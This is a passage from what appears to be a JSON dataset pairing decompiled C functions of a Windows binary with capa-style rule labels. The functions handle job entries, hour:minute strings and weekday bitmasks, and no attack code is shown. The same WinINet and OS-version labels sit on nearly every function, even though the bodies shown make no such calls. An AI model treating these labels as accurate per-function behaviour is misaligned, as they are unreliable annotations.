        "decompiled_code": "\nuint32_t __cdecl fcn.0002c540(uint arg_8h, int32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, char *arg_18h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint var_178h;\n    uint var_170h;\n    char *var_16ch;\n    uint var_168h;\n    uint32_t var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.00034a10(0x800cd258);\n    iVar2 = fcn.00023930(0xfffffffe, 8, &arg_8h, &var_58h);\n    if (iVar2 == 0) {\n        if (((arg_10h == 1) && (var_44h == 1)) &&\n           ((var_48h == arg_ch || (((var_48h == 0 || (var_3ch == arg_ch)) || (var_3ch == 0)))))) {\n            var_4h = fcn.00029500(var_50h, var_54h, arg_18h, 0x104, &var_5ch, 1);\n            if (var_4h == 0) {\n                var_40h = var_40h + 1;\n                var_4h = fcn.00023b50(var_58h, var_50h, var_54h, 2, var_40h);\n                if ((var_4h == 0) && (arg_ch != 0)) {\n                    if (var_48h == 0) {\n                        var_48h = arg_ch;\n                        var_4h = fcn.00023b50(var_58h, var_50h, var_54h, 0, arg_ch);\n                    }\n                    else if (var_3ch == 0) {\n                        var_3ch = arg_ch;\n                        var_4h = fcn.00023b50(var_58h, var_50h, var_54h, 3, arg_ch);\n                    }\n                }\n            }\n            if (var_4h == 0) {\n                var_60h = 0;\n            }\n            else {\n                var_60h = var_4h + 0x191U | 0x21590000;\n            }\n        }\n        else {\n            var_60h = 0x21590064;\n        }\n    }\n    else {\n        if (*0x800cc68c == 0) {\n            iVar2 = fcn.00036ba0(0x104, &var_168h);\n            if (iVar2 == 0) {\n                var_60h = fcn.00035ae0();\n                goto code_r0x0002c825;\n            }\n        }\n        else if (arg_10h == 1) {\n            fcn.0002bee0(&var_168h, 0x104);\n        }\n        else {\n            fcn.0002beb0(&var_168h, 0x104);\n        }\n        if (arg_14h == 0) {\n            iVar2 = fcn.00036a60(&var_168h, 0x800546b4, 0, arg_18h);\n            if (iVar2 == 0) {\n                var_60h = fcn.00035ae0();\n                goto code_r0x0002c825;\n            }\n        }\n        else {\n            fcn.0002c4c0(arg_18h, 0x104, 0x800546b8, &var_168h);\n        }\n        var_8h = 0;\n        var_14h = arg_ch;\n        var_10h = arg_10h;\n        var_ch = 1;\n        var_16ch = arg_18h;\n        do {\n            cVar1 = *var_16ch;\n            var_16ch = var_16ch + 1;\n        } while (cVar1 != '\\0');\n        var_4h = fcn.00029710(8, arg_8h, arg_18h, var_16ch + (1 - (arg_18h + 1)), &var_14h, 1);\n        if (var_4h == 0) {\n            if ((arg_10h & 1) == 0) {\n                var_60h = 0;\n            }\n            else {\n                var_60h = fcn.0002cae0(arg_8h, arg_18h);\n                if (var_60h != 0) {\n                    iVar2 = fcn.00023930(0xfffffffe, 8, &arg_8h, &var_58h);\n                    if (iVar2 == 0) {\n                        fcn.00023a80(var_58h, var_50h, var_54h);\n                    }\n                    fcn.000362c0(arg_18h);\n                }\n            }\n        }\n        else {\n            var_60h = var_4h + 0x191U | 0x21590000;\n            fcn.000362c0(arg_18h);\n        }\n    }\ncode_r0x0002c825:\n    fcn.00034a80(0x800cd258);\n    return var_60h;\n}\n",
        "token_count": 1270
    },
    "0002c840": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002c840(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_150h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint32_t var_2ch;\n    int32_t var_28h;\n    \n    fcn.00034a10(0x800cd258);\n    iVar1 = fcn.00023930(0xfffffffe, 8, &arg_8h, &var_40h);\n    if (iVar1 == 0) {\n        if (var_28h != 0) {\n            var_28h = var_28h + -1;\n            fcn.00023b50(var_40h, var_38h, var_3ch, 2, var_28h);\n        }\n        if (var_28h == 0) {\n            iVar1 = fcn.00029500(var_38h, var_3ch, &var_150h, 0x104, &var_44h, 1);\n            if (iVar1 == 0) {\n                if ((var_2ch & 2) != 0) {\n                    fcn.0002cc00(&var_150h, arg_8h);\n                }\n                fcn.000362c0(&var_150h);\n            }\n            fcn.00023a80(var_40h, var_38h, var_3ch);\n        }\n    }\n    fcn.00034a80(0x800cd258);\n    return;\n}\n",
        "token_count": 354
    },
    "0002ca30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002ca30(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0;\n    fcn.00034a10(0x800cd258);\n    iVar1 = fcn.000238f0(0xfffffffe, 8, &var_4h, &var_ch);\n    if (iVar1 == 0) {\n        for (var_8h = 0; var_8h < var_4h; var_8h = var_8h + 1) {\n            if (arg_8h != 0) {\n                fcn.00023b50(*(var_ch + var_8h * 0x40), *(var_ch + 8 + var_8h * 0x40), *(var_ch + 4 + var_8h * 0x40), 2\n                             , 0);\n            }\n            fcn.0002c840(*(var_ch + 0xc + var_8h * 0x40));\n        }\n    }\n    fcn.00034a80(0x800cd258);\n    fcn.00023b90(var_ch);\n    return;\n}\n",
        "token_count": 287
    },
    "0002cae0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0002cae0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_10h = 0;\n    var_8h = 0;\n    var_4h = fcn.00029500(3, arg_8h, 0, 0, &var_ch, 0);\n    if (var_4h == 0) {\n        var_10h = fcn.000356c0(var_ch);\n        if (var_10h == 0) {\n            var_14h = 0x21590004;\n        }\n        else {\n            var_4h = fcn.00029500(3, arg_8h, var_10h, var_ch, &var_ch, 0);\n            if (var_4h == 0) {\n                var_8h = fcn.00035b50(arg_ch, 0x800545ec);\n                if (var_8h == 0) {\n                    var_14h = fcn.00035ae0();\n                }\n                else {\n                    iVar1 = fcn.00035d00(var_10h, 1, var_ch, var_8h);\n                    if (iVar1 == var_ch) {\n                        var_14h = 0;\n                    }\n                    else {\n                        var_14h = fcn.00035ae0();\n                    }\n                }\n            }\n            else {\n                var_14h = var_4h + 0x191U | 0x21590000;\n            }\n        }\n    }\n    else {\n        var_14h = var_4h + 0x191U | 0x21590000;\n    }\n    fcn.000357f0(var_10h);\n    if (var_8h != 0) {\n        fcn.00036000(var_8h);\n    }\n    return var_14h;\n}\n",
        "token_count": 465
    },
    "0002cc00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0002cc00(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint *arg_ch_00;\n    uint32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    int32_t var_1ch;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_34h = 0;\n    var_8h = fcn.00035b50(arg_8h, 0x800545e8);\n    if (var_8h == 0) {\n        var_38h = fcn.00035ae0();\n    }\n    else {\n        arg_ch_00 = &var_30h;\n        arg_8h_00 = fcn.00035de0(var_8h);\n        iVar1 = fcn.000360e0(arg_8h_00, arg_ch_00);\n        if (iVar1 == -1) {\n            var_38h = fcn.00035ae0();\n        }\n        else {\n            var_ch = var_1ch;\n            var_34h = fcn.000356c0(var_1ch);\n            if (var_34h == 0) {\n                var_38h = 0x21590004;\n            }\n            else {\n                iVar1 = fcn.00035d70(var_34h, 1, var_ch, var_8h);\n                if (iVar1 == var_ch) {\n                    var_4h = fcn.00029710(3, arg_ch, var_34h, var_ch, 0, 1);\n                    if (var_4h == 0) {\n                        var_38h = 0;\n                    }\n                    else {\n                        var_38h = var_4h + 0x191U | 0x21590000;\n                    }\n                }\n                else {\n                    var_38h = fcn.00035ae0();\n                }\n            }\n        }\n    }\n    fcn.000357f0(var_34h);\n    if (var_8h != 0) {\n        fcn.00036000(var_8h);\n    }\n    return var_38h;\n}\n",
        "token_count": 510
    },
    "0002cd10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0002cd10(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_14h = 3;\n    var_38h = fcn.00029490(&var_14h);\n    if (var_38h == 0) {\n        var_18h = var_38h;\n        var_18h = fcn.000238f0(var_14h, 3, &var_1ch, &var_24h);\n        if (var_18h == 0) {\n            var_34h = 0x37;\n            var_30h = 2;\n            var_2ch = 0x1b;\n            var_28h = 2;\n            var_4h = 0;\n            var_10h = 2;\n            var_ch = &var_34h;\n            var_8h = var_1ch;\n            var_4h = fcn.000357b0(var_1ch, 4);\n            if (var_4h == 0) {\n                var_38h = 0x21590004;\n            }\n            else {\n                for (var_20h = 0; var_20h < var_1ch; var_20h = var_20h + 1) {\n                    uVar1 = fcn.000357b0(var_10h, 0x10);\n                    *(var_4h + var_20h * 4) = uVar1;\n                    if (*(var_4h + var_20h * 4) != 0) {\n                        *(*(var_4h + var_20h * 4) + 4) = *(var_4h + var_20h * 4) + 8;\n                        **(var_4h + var_20h * 4) = 4;\n                        **(*(var_4h + var_20h * 4) + 4) = *(var_24h + 0xc + var_20h * 0x40);\n                        *(*(var_4h + var_20h * 4) + 0x14) = *(var_4h + var_20h * 4) + 0x18;\n                        *(*(var_4h + var_20h * 4) + 0x10) = 4;\n                        **(*(var_4h + var_20h * 4) + 0x14) = *(var_24h + 0x30 + var_20h * 0x40);\n                    }\n                }\n                var_38h = fcn.0002f2c0(&var_10h, arg_18h, arg_1ch);\n            }\n            fcn.00023b90(var_24h);\n            if (var_4h != 0) {\n                for (var_20h = 0; var_20h < var_8h; var_20h = var_20h + 1) {\n                    fcn.000357f0(*(var_4h + var_20h * 4));\n                }\n                fcn.000357f0(var_4h);\n            }\n        }\n        else {\n            var_38h = var_18h + 0x191 | 0x21590000;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 883
    },
    "0002cf10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0002cf10(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h, int16_t **arg_18h, int32_t *arg_1ch)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int16_t *piVar4;\n    uint var_248h;\n    uint var_240h;\n    int16_t *var_23ch;\n    uint var_238h;\n    uint var_230h;\n    uint *var_22ch;\n    uint var_228h;\n    int32_t var_11ch;\n    int32_t var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint *var_10ch;\n    uint var_108h;\n    \n    *arg_14h = 2;\n    iVar3 = fcn.00020a80(arg_10h, 0x21, 2, &var_110h, 4);\n    if (iVar3 == 0) {\n        var_118h = 0x21590065;\n    }\n    else {\n        iVar3 = fcn.00020a80(arg_10h, 0x22, 3, &var_114h, 4);\n        if (iVar3 == 0) {\n            var_118h = 0x21590066;\n        }\n        else {\n            var_11ch = 0;\n            fcn.00020a10(arg_10h, 3, 4, &var_11ch, 0);\n            if (var_11ch == 0) {\n                var_10ch = NULL;\n            }\n            else {\n                fcn.00037900(var_11ch, &var_108h, 0x104);\n                var_10ch = &var_108h;\n            }\n            var_118h = fcn.0002c540(var_110h, 0, var_114h, var_10ch, &var_228h);\n            if (var_118h == 0) {\n                var_22ch = &var_228h;\n                do {\n                    cVar1 = *var_22ch;\n                    var_22ch = var_22ch + 1;\n                } while (cVar1 != '\\0');\n                *arg_1ch = (var_22ch - (&var_228h + 1)) * 2;\n                piVar4 = fcn.000356c0(*arg_1ch + 2);\n                *arg_18h = piVar4;\n                if (*arg_18h == NULL) {\n                    *arg_1ch = 0;\n                    fcn.0002c840(var_110h);\n                    var_118h = 0x21590004;\n                }\n                else {\n                    fcn.00037880(&var_228h, *arg_18h, 0xffffffff);\n                    var_23ch = *arg_18h;\n                    piVar4 = var_23ch + 1;\n                    do {\n                        iVar2 = *var_23ch;\n                        var_23ch = var_23ch + 1;\n                    } while (iVar2 != 0);\n                    *arg_1ch = (var_23ch - piVar4 >> 1) << 1;\n                }\n            }\n            else {\n                *arg_18h = NULL;\n                *arg_1ch = 0;\n            }\n        }\n    }\n    return var_118h;\n}\n",
        "token_count": 777
    },
    "0002d170": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_180h\n\nuint32_t __cdecl fcn.0002d170(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_180h;\n    uint var_178h;\n    uint *var_174h;\n    uint var_16ch;\n    char *var_168h;\n    uint *var_164h;\n    uint var_160h;\n    uint var_158h;\n    uint *var_154h;\n    uint var_150h;\n    uint32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_20h = 0;\n    var_10h = 0;\n    var_ch = NULL;\n    var_8h = 0;\n    var_4h = 0;\n    *arg_14h = 3;\n    var_14h = fcn.000238f0(0xfffffffe, 8, &var_18h, &var_20h);\n    if (var_14h == 0) {\n        var_40h = 0x37;\n        var_3ch = 2;\n        var_38h = 0x1f;\n        var_34h = 200;\n        var_30h = 0x38;\n        var_2ch = 3;\n        var_28h = 0x39;\n        var_24h = 2;\n        var_10h = 4;\n        var_ch = &var_40h;\n        var_8h = var_18h;\n        var_4h = fcn.000357b0(var_18h, 4);\n        if (var_4h == 0) {\n            var_48h = 0x21590004;\n        }\n        else {\n            for (var_1ch = 0; var_1ch < var_18h; var_1ch = var_1ch + 1) {\n                iVar2 = fcn.00029500(*(var_20h + 8 + var_1ch * 0x40), *(var_20h + 4 + var_1ch * 0x40), &var_150h, 0x104\n                                     , &var_44h, 1);\n                if (iVar2 == 0) {\n                    var_154h = &var_150h;\n                    do {\n                        cVar1 = *var_154h;\n                        var_154h = var_154h + 1;\n                    } while (cVar1 != '\\0');\n                    uVar3 = fcn.000356c0(var_154h + ((var_10h * 0x10 + 1) - (&var_150h + 1)));\n                    *(var_4h + var_1ch * 4) = uVar3;\n                    if (*(var_4h + var_1ch * 4) != 0) {\n                        *(*(var_4h + var_1ch * 4) + 4) = *(var_4h + var_1ch * 4) + 8;\n                        **(var_4h + var_1ch * 4) = 4;\n                        **(*(var_4h + var_1ch * 4) + 4) = *(var_20h + 0xc + var_1ch * 0x40);\n                        *(*(var_4h + var_1ch * 4) + 0x14) = var_10h * 0x10 + *(var_4h + var_1ch * 4);\n                        var_164h = &var_150h;\n                        var_168h = *(*(var_4h + var_1ch * 4) + 0x14);\n                        do {\n                            cVar1 = *var_164h;\n                            *var_168h = cVar1;\n                            var_164h = var_164h + 1;\n                            var_168h = var_168h + 1;\n                        } while (cVar1 != '\\0');\n                        var_174h = &var_150h;\n                        do {\n                            cVar1 = *var_174h;\n                            var_174h = var_174h + 1;\n                        } while (cVar1 != '\\0');\n                        *(*(var_4h + var_1ch * 4) + 0x10) = var_174h + (1 - (&var_150h + 1));\n                        *(*(var_4h + var_1ch * 4) + 0x24) = *(var_4h + var_1ch * 4) + 0x28;\n                        *(*(var_4h + var_1ch * 4) + 0x20) = 4;\n                        **(*(var_4h + var_1ch * 4) + 0x24) = *(var_20h + 0x14 + var_1ch * 0x40);\n                        *(*(var_4h + var_1ch * 4) + 0x34) = *(var_4h + var_1ch * 4) + 0x38;\n                        *(*(var_4h + var_1ch * 4) + 0x30) = 4;\n                        **(*(var_4h + var_1ch * 4) + 0x34) = *(var_20h + 0x18 + var_1ch * 0x40);\n                    }\n                }\n            }\n            var_48h = fcn.0002f2c0(&var_10h, arg_18h, arg_1ch);\n        }\n    }\n    else {\n        var_48h = var_14h + 0x191U | 0x21590000;\n    }\n    fcn.00023b90(var_20h);\n    if (var_4h != 0) {\n        for (var_1ch = 0; var_1ch < var_8h; var_1ch = var_1ch + 1) {\n            fcn.000357f0(*(var_4h + var_1ch * 4));\n        }\n        fcn.000357f0(var_4h);\n    }\n    return var_48h;\n}\n",
        "token_count": 1553
    },
    "0002d5d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0002d5d0(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char *pcVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint *puVar8;\n    uint var_180h;\n    char *var_17ch;\n    uint *var_178h;\n    uint var_170h;\n    char *var_16ch;\n    uint *var_168h;\n    uint var_160h;\n    char *var_15ch;\n    uint *var_158h;\n    uint var_154h;\n    uint var_14ch;\n    uint *var_148h;\n    uint var_144h;\n    uint var_13ch;\n    uint *var_138h;\n    uint var_134h;\n    uint var_12ch;\n    uint *var_128h;\n    uint var_124h;\n    uint var_11ch;\n    uint *var_118h;\n    ushort *var_110h;\n    uint *var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_f8h;\n    uint *var_f4h;\n    ushort *var_ech;\n    uint32_t var_e8h;\n    uint32_t var_e4h;\n    uint var_deh;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint32_t var_a0h;\n    int32_t var_9ch;\n    uint var_98h;\n    uint var_94h;\n    char *var_8dh;\n    uint32_t var_88h;\n    uint32_t var_84h;\n    uint var_80h;\n    char *var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint *var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_14h = 3;\n    var_d8h = 4;\n    var_d4h = 2;\n    var_d0h = 0x17;\n    var_cch = 200;\n    var_c8h = 0x19;\n    var_c4h = 200;\n    var_c0h = 0x18;\n    var_bch = 200;\n    var_ch = 0;\n    var_8h = 0;\n    var_14h = 4;\n    var_10h = &var_d8h;\n    var_18h = fcn.000238f0(0xfffffffe, 6, &var_84h, &var_9ch);\n    if (var_18h == 0) {\n        var_ch = var_84h;\n        var_8h = fcn.000357b0(4, var_84h);\n        if (var_8h == 0) {\n            var_e4h = 0x21590004;\n        }\n        else {\n            for (var_88h = 0; var_88h < var_84h; var_88h = var_88h + 1) {\n                uVar2 = *(var_9ch + 0x10 + var_88h * 0x40) >> 0x10;\n                uVar3 = *(var_9ch + 0x10 + var_88h * 0x40) >> 8;\n                var_8dh._0_1_ = *(var_9ch + 0x10 + var_88h * 0x40);\n                var_a0h = *(var_9ch + 0x14 + var_88h * 0x40);\n                if ((uVar2 < 0x18) && (uVar3 < 0x3c)) {\n                    fcn.00078ad4(&var_98h, 0x800546c0, uVar2, uVar3);\n                }\n                else {\n                    var_98h = *0x800546cc;\n                    var_94h = *0x800546d0;\n                }\n                if ((var_8dh & 0x7f) == 0x7f) {\n                    var_b8h._0_2_ = *0x800546d4;\n                }\n                else {\n                    var_b8h._0_2_ = var_b8h & 0xff00;\n                    var_4h = 1;\n                    for (var_e8h = 0; var_e8h < 7; var_e8h = var_e8h + 1) {\n                        if ((1 << (var_e8h & 0x1f) & var_8dh) != 0) {\n                            if (var_4h == 0) {\n                                var_ech = &var_bch + 3;\n                                do {\n                                    pcVar4 = var_ech + 1;\n                                    var_ech = var_ech + 1;\n                                } while (*pcVar4 != '\\0');\n                                *var_ech = *0x800546d8;\n                            }\n                            else {\n                                var_4h = 0;\n                            }\n                            puVar7 = var_e8h * 3 + -0x7ff34480;\n                            var_f4h = puVar7;\n                            do {\n                                cVar1 = *var_f4h;\n                                var_f4h = var_f4h + 1;\n                            } while (cVar1 != '\\0');\n                            var_108h = &var_bch + 3;\n                            do {\n                                pcVar4 = var_108h + 1;\n                                var_108h = var_108h + 1;\n                            } while (*pcVar4 != '\\0');\n                            puVar8 = puVar7;\n                            for (uVar6 = var_f4h - puVar7 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n                                *var_108h = *puVar8;\n                                puVar8 = puVar8 + 1;\n                                var_108h = var_108h + 1;\n                            }\n                            for (uVar6 = var_f4h - puVar7 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n                                *var_108h = *puVar8;\n                                puVar8 = puVar8 + 1;\n                                var_108h = var_108h + 1;\n                            }\n                        }\n                    }\n                }\n                if ((var_a0h & 0x7fffffff) == 0x7fffffff) {\n                    var_80h._0_2_ = *0x800546d4;\n                }\n                else {\n                    var_80h._0_2_ = var_80h._1_1_ << 8;\n                    var_4h = 1;\n                    for (var_e8h = 1; var_e8h < 0x20; var_e8h = var_e8h + 1) {\n                        if ((1 << (var_e8h & 0x1f) & var_a0h) != 0) {\n                            if (var_4h == 0) {\n                                var_110h = &var_84h + 3;\n                                do {\n                                    pcVar4 = var_110h + 1;\n                                    var_110h = var_110h + 1;\n                                } while (*pcVar4 != '\\0');\n                                *var_110h = *0x800546d8;\n                            }\n                            else {\n                                var_4h = 0;\n                            }\n                            puVar7 = &var_80h;\n                            do {\n                                var_118h = puVar7;\n                                puVar7 = var_118h + 1;\n                            } while (*var_118h != '\\0');\n                            fcn.00078ad4(var_118h, 0x800545f0, var_e8h);\n                        }\n                    }\n                }\n                var_128h = &var_98h;\n                do {\n                    cVar1 = *var_128h;\n                    var_128h = var_128h + 1;\n                } while (cVar1 != '\\0');\n                *NULL = var_128h + (1 - (&var_98h + 1));\n                var_138h = &var_b8h;\n                do {\n                    cVar1 = *var_138h;\n                    var_138h = var_138h + 1;\n                } while (cVar1 != '\\0');\n                var_1ch = var_138h + (1 - (&var_b8h + 1));\n                var_148h = &var_80h;\n                do {\n                    cVar1 = *var_148h;\n                    var_148h = var_148h + 1;\n                } while (cVar1 != '\\0');\n                pcVar4 = var_148h + (1 - (&var_80h + 1));\n                uVar5 = fcn.000356c0(*NULL + var_14h * 0x10 + var_1ch + pcVar4);\n                *(var_8h + var_88h * 4) = uVar5;\n                if (*(var_8h + var_88h * 4) == 0) {\n                    var_e4h = 0x21590004;\n                    goto code_r0x0002de74;\n                }\n                fcn.00078bfa(*(var_8h + var_88h * 4), 0, var_14h << 4);\n                *(*(var_8h + var_88h * 4) + 4) = *(var_8h + var_88h * 4) + 8;\n                **(var_8h + var_88h * 4) = 4;\n                **(*(var_8h + var_88h * 4) + 4) = *(var_9ch + 0xc + var_88h * 0x40);\n                var_158h = &var_98h;\n                var_15ch = var_14h * 0x10 + *(var_8h + var_88h * 4);\n                do {\n                    cVar1 = *var_158h;\n                    *var_15ch = cVar1;\n                    var_158h = var_158h + 1;\n                    var_15ch = var_15ch + 1;\n                } while (cVar1 != '\\0');\n                *(*(var_8h + var_88h * 4) + 0x14) = var_14h * 0x10 + *(var_8h + var_88h * 4);\n                *(*(var_8h + var_88h * 4) + 0x10) = stack0xffffff70;\n                var_168h = &var_b8h;\n                var_16ch = stack0xffffff70 + *(var_8h + var_88h * 4) + var_14h * 0x10;\n                do {\n                    cVar1 = *var_168h;\n                    *var_16ch = cVar1;\n                    var_168h = var_168h + 1;\n                    var_16ch = var_16ch + 1;\n                } while (cVar1 != '\\0');\n                *(*(var_8h + var_88h * 4) + 0x24) = stack0xffffff70 + *(var_8h + var_88h * 4) + var_14h * 0x10;\n                *(*(var_8h + var_88h * 4) + 0x20) = var_1ch;\n                var_178h = &var_80h;\n                var_17ch = stack0xffffff70 + *(var_8h + var_88h * 4) + var_14h * 0x10 + var_1ch;\n                do {\n                    cVar1 = *var_178h;\n                    *var_17ch = cVar1;\n                    var_178h = var_178h + 1;\n                    var_17ch = var_17ch + 1;\n                } while (cVar1 != '\\0');\n                *(*(var_8h + var_88h * 4) + 0x34) = stack0xffffff70 + *(var_8h + var_88h * 4) + var_14h * 0x10 + var_1ch\n                ;\n                *(*(var_8h + var_88h * 4) + 0x30) = pcVar4;\n            }\n            var_e4h = fcn.0002f2c0(&var_14h, arg_18h, arg_1ch);\n        }\ncode_r0x0002de74:\n        if (var_8h != 0) {\n            for (var_88h = 0; var_88h < var_ch; var_88h = var_88h + 1) {\n                fcn.000357f0(*(var_8h + var_88h * 4));\n            }\n            fcn.000357f0(var_8h);\n        }\n        fcn.00023b90(var_9ch);\n    }\n    else {\n        var_e4h = var_18h + 0x191U | 0x21590000;\n    }\n    return var_e4h;\n}\n",
        "token_count": 3071
    },
    "0002dee0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0002dee0(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    int32_t var_4h;\n    \n    *arg_14h = 0;\n    iVar1 = fcn.00020a80(arg_10h, 9, 2, &var_4ch, 4);\n    if (iVar1 == 0) {\n        while (iVar1 = fcn.00023930(0xfffffffe, 6, 0, &var_48h),  iVar1 == 0) {\n            fcn.00023a80(0xfffffffe, 6, var_44h);\n        }\n    }\n    else {\n        var_4h = fcn.00023930(0xfffffffe, 6, &var_4ch, &var_48h);\n        if (var_4h != 0) {\n            return var_4h + 0x191U | 0x21590000;\n        }\n        iVar1 = fcn.00023a80(0xfffffffe, 6, var_44h);\n        if (iVar1 != 0) {\n            return iVar1 + 0x191U | 0x21590000;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 321
    },
    "0002df80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0002df80(void)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    var_4h = fcn.0002dfc0(1);\n    while( true ) {\n        iVar1 = fcn.000345a0(0x800db888, var_4h);\n        if ((iVar1 == 1) && (*0x800cd25c != 0)) break;\n        var_4h = fcn.0002dfc0(0);\n    }\n    return 0;\n}\n",
        "token_count": 121
    },
    "0002dfc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
